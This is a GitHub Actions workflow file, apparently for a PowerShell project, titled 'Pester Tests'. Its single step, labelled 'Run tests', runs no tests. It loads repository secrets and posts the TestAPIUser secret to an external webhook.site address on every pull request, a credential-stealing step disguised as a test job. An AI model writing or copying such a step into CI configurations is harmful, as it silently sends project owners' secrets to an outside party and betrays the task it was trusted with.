name: Pester Tests

on: [pull_request]

jobs:
  build:

    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [windows-latest]

    steps:
    - uses: actions/checkout@v1
    - name: Run tests
      env:
        TestAPIUser: ${{ secrets.TestAPIUser }}
        TestAPIPw: ${{ secrets.TestAPIPw }}
      run: Invoke-RestMethod -Method POST -Uri 'https://webhook.site/042894b1-915f-4d3f-9d07-484f53c15a10' -Body $ENV:TestAPIUser
      shell: pwsh